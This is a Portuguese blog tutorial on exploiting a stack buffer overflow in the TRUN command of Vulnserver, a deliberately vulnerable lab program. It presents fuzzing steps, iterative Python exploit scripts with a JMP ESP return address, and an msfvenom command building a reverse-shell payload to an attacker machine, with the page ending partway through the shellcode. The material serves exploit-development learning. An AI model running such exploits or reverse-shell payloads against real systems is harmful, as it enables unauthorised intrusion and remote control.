<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF" /><meta name="author" content="Hastur" /><meta property="og:locale" content="en" /><meta name="description" content="COMANDO TRUN" /><meta property="og:description" content="COMANDO TRUN" /><link rel="canonical" href="https://h41stur.github.io/posts/std-winbof-2/" /><meta property="og:url" content="https://h41stur.github.io/posts/std-winbof-2/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/std/winbof/winbof-logo-2.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-06T13:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/std/winbof/winbof-logo-2.png" /><meta property="twitter:title" content="Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Hastur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Hastur"},"dateModified":"2021-12-13T15:54:13-03:00","datePublished":"2021-10-06T13:00:00-03:00","description":"COMANDO TRUN","headline":"Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF","image":"https://h41stur.github.io/img/std/winbof/winbof-logo-2.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/std-winbof-2/"},"url":"https://h41stur.github.io/posts/std-winbof-2/"}</script><title>Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Hastur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Oct 6, 2021, 1:00 PM -0300" >Oct 6, 2021<i class="unloaded">2021-10-06T13:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 13, 2021, 3:54 PM -0300" >Dec 13, 2021<i class="unloaded">2021-12-13T15:54:13-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1962 words">10 min read</span></div></div><div class="post-content"><h1 id="comando-trun">COMANDO TRUN</h1><p>O comando TRUN, assim como os demais, recebe um argumento e dá uma resposta.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-1.png" alt="Enumaração do comando." /></p><p>Sabendo de seu funcionamento, precisamos fazer o fuzzing do comando e descobrir se conseguimos causar o crash no programa.</p><h2 id="fuzzing">FUZZING</h2><p>Para fazer o fuzzing, vamos utilizar o protocolo Spike. Para tanto, vamos criar nosso script.</p><p>trun.spk:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>s_string<span class="o">(</span><span class="s2">"TRUN "</span><span class="o">)</span><span class="p">;</span>
s_string_variable<span class="o">(</span><span class="s2">"*"</span><span class="o">)</span><span class="p">;</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><strong>s_string</strong>: é um parâmetro imutável, no nosso caso, sempre irá enviar “TRUN ” (não esqueça do espaço após o TRUN);<li><strong>s_string_variable</strong>: é um parâmetro que indica o que seŕá mudato em cada envio.</ul><p>Antes de enviar o fuzzing, vamos iniciar o wireshark monitorando nossa conexão.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-2.png" alt="Iniciando o Wireshark." /></p><p>Com o programa iniciado na máquina Windows, vamos enviar nosso fuzzing com o script “generic_sender_tcp”.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-3.png" alt="Iniciando o fuzzing." /></p><p>Podemos ver que na terceira iteração, o programa parou de responder, automaticamente fechou na máquina Windows. Analisando o dump no WIreshark, podemos verificar o que foi enviado.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-4.png" alt="Interceptando no Wireshark." /></p><h2 id="exploração">EXPLORAÇÃO</h2><p>Agora que sabemos que o programa sofreu um crash com 5061 bytes, já incluindo o comando “TRUN /…/”, podemos iniciar o esboço do exploit.</p><p>xpltrun.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># tamanho do offset encontrado no fuzzing
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5061</span>

<span class="c1"># payload a ser enviado
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">TRUN /../</span><span class="sh">"</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">offset</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># cria o socket
</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span> <span class="c1"># conecta no alvo
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># envia o payload
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span> <span class="c1"># fecha conexao
</span></pre></table></code></div></div><p>Precisamos iniciar o vulsnerver, mas agora com o Immunity Debbuger.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-5.png" alt="Immunity." /></p><p>Com tudo pronto, podemos rodar nosso script.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-6.png" alt="Immunity." /></p><p>Podemos observar que nosso payload sobrescreveu o EIP e o ESP com nossos “A”, nesse momento encontramos o buffer overflow “vanilla”, que é a forma mais simples de buffer overflow.</p><p>Sabendo disso, precisamos encontrar o offset preciso para atingir o EIP, podemos criar um pattern cíclico com o msf-pattern_create.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-7.png" alt="Immunity." /></p><p>Vamos inserí-lo em nosso script.</p><p>xpltrun.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># tamanho do offset encontrado no fuzzing
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5061</span>

<span class="c1"># payload a ser enviado
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">TRUN /../</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">&lt;o patter vai aqui&gt;</span><span class="sh">"</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># cria o socket
</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span> <span class="c1"># conecta no alvo
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># envia o payload
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span> <span class="c1"># fecha conexao
</span></pre></table></code></div></div><p>Agora vamos rodar o script novamente, e monitorar com o Immunity Debugger.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-8.png" alt="Immunity." /></p><p>Novamente o programa sofreu crash, mas temos o endereço do EIP: 386F4337. Vamos consultar no msf-pattern_offset para identificar o endereço preciso para sobrescrever o ESP.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-9.png" alt="Immunity." /></p><p>Temos o offset preciso para atingir o EIP: 2003 bytes. Vamos atualizar nosso exploit e verificar, vamos inserir 2003 “A” + 4 “B” e o restante de “C”, se o offset estiver correto, vamos preencher o EIP com “42424242” (B em hexa), e o ESP com vários “C”.</p><p>xpltrun.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># tamanho do offset encontrado no fuzzing
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5061</span>

<span class="c1"># payload a ser enviado
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">TRUN /../</span><span class="sh">"</span> <span class="c1"># funcao inicial
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">2003</span> <span class="c1"># preenchimento do buffer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># sobrescreve EIP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5061</span> <span class="o">-</span> <span class="mi">2003</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="c1"># sobrescreve ESP
</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># cria o socket
</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span> <span class="c1"># conecta no alvo
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># envia o payload
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span> <span class="c1"># fecha conexao
</span></pre></table></code></div></div><p>Vamos reiniciar o vulnserver no Immunity debbuger e rodar nosso script novamente.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-10.png" alt="Immunity." /></p><p>Conseguimos sobrescrever com precisão o EIP com “42424242” e o ESP com nossa sequencia de “C”. A partir de agora, temos total controle sobre como o programa se comporta, precisamos encontrar quais são os badchars.</p><h2 id="identificando-badchars">IDENTIFICANDO BADCHARS</h2><p>Para gerar uma sequência com todos os caracteres possíveis, vamos utilizar a ferramenta “badchars” do python, para instalar basta executar <code class="language-plaintext highlighter-rouge">pip install badchars</code>.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-11.png" alt="Immunity." /></p><p>Vamos adicionar estes badchars em nosso payload no lugar dos “C” e rodar novamente.</p><p>xpltrun.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># tamanho do offset encontrado no fuzzing
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5061</span>

<span class="c1"># payload a ser enviado
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">TRUN /../</span><span class="sh">"</span> <span class="c1"># funcao inicial
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">2003</span> <span class="c1"># preenchimento do buffer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># sobrescreve EIP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="sh">"</span> <span class="c1"># sobrescreve ESP
</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># cria o socket
</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span> <span class="c1"># conecta no alvo
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># envia o payload
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span> <span class="c1"># fecha conexao
</span></pre></table></code></div></div><p>Após reiniciar o vulnserver no Immunity, vamos rodar o script novamente.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-12.png" alt="Immunity." /></p><p>Novamente o programa quebrou e reescreveu o EIP com os 42. Se observarmos a imagem, veremos que todos os carcteres foram aceitos, com excessão do byte “\x00” que não enviamos por ser geralmente um badchar, ou seja praticamente não temos limitação para gerar o shellcode. Agora precisamos encontrar um bom endereço de retorno.</p><h2 id="encontrando-um-bom-endereço-de-retorno">ENCONTRANDO UM BOM ENDEREÇO DE RETORNO</h2><p>O nosso payload vai sobrescrever o buffer, o EIP e o ESP, logo, nosso shellcode será armazenado no ESP, por tanto, precisamos manipular nosso EIP para que aponte para o endereço do ESP quando enviarmos nosso payload. No entanto, ao obervarmos as imagens, cada vez que executamos o payload, o ESP mudou de endereço, pois ele é dinâmico e é praticamente impossível descobrir qual endereço vai estar quando rodarmos o payload.</p><p>Para eliminarmos este problema, existe o registrador “jump” (JMP) que faz saltos na execução para outros registradores, se encontrarmos na dll do programa, algum jump que aponte para o ESP, podemos preencher o endereço do EIP com o endereço deste jump, fazendo com que, quando a execução chegue nesse ponto, ele pule para o endereço do nosso shellcode.</p><p>Para encontrar possíveis jumps que apontem para o ESP, podemos usar o próprio Immunity na sua barra de pesquisa através do plugin “mona.py”, procurando por <code class="language-plaintext highlighter-rouge">!mona jmp -r esp</code>.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-13.png" alt="Immunity." /></p><p>Encontramos 9 bons endereços para incluir em nosso payload.</p><h2 id="inserindo-o-endereço-de-retorno-no-payload">INSERINDO O ENDEREÇO DE RETORNO NO PAYLOAD</h2><p>Em posse do endereço de retorno, vamos adicionar um deles no lugar de nossos B, eu vou utilizar o 62501203 , porém a notação para envio tem que ser em little indian, portanto os bytes tem ordem inversa, ficando: \x03\x12\x50\x62. Vamos atualizar o exploit.</p><p>xpltrun.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># variaveis de conexao
</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>

<span class="c1"># tamanho do offset encontrado no fuzzing
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">5061</span>

<span class="c1"># payload a ser enviado
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">TRUN /../</span><span class="sh">"</span> <span class="c1"># funcao inicial
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">2003</span> <span class="c1"># preenchimento do buffer
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x03\x12\x50\x62</span><span class="sh">"</span> <span class="c1"># sobrescreve EIP com JMP ESP
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5062</span> <span class="o">-</span> <span class="mi">2003</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="c1"># sobrescreve ESP
</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># cria o socket
</span><span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span> <span class="c1"># conecta no alvo
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># envia o payload
</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span> <span class="c1"># fecha conexao
</span></pre></table></code></div></div><p>Com o nosso script atualizado, vamos inserir um breakpoint no Immunity, exatamente em nosso endereço de retorno, para isso podemos pesquisar o endereço através do botão “Go to address Disassembler” e em seguida pressionar “F2”. Com o breakpoint configurado, vamos reiniciar o vulnserver no Immunity e rodar nosso script.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-14.png" alt="Immunity." /></p><p>Após o programa parar em nosso breakpoint, podemos clicar em “F7” para avançar para próxima instrução, e veremos que caímos exatamente em nosso buffer de “C”.</p><h2 id="gerando-o-shellcode-e-organizando-o-exploit">GERANDO O SHELLCODE E ORGANIZANDO O EXPLOIT</h2><p>Para gerar nosso shellcode, vamos utilizar outro programa da suide MSF, o msfvenom, onde vamos configurar a conexão reversa com nossa máquina atacante.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.1.12 <span class="nv">lport</span><span class="o">=</span>8443 <span class="nt">-b</span> <span class="s1">'\x00'</span> <span class="nt">-v</span> shellcode <span class="nt">-f</span> py
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1965 bytes
shellcode <span class="o">=</span>  b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">90</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">4f</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">04"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">9e</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">87"</span>
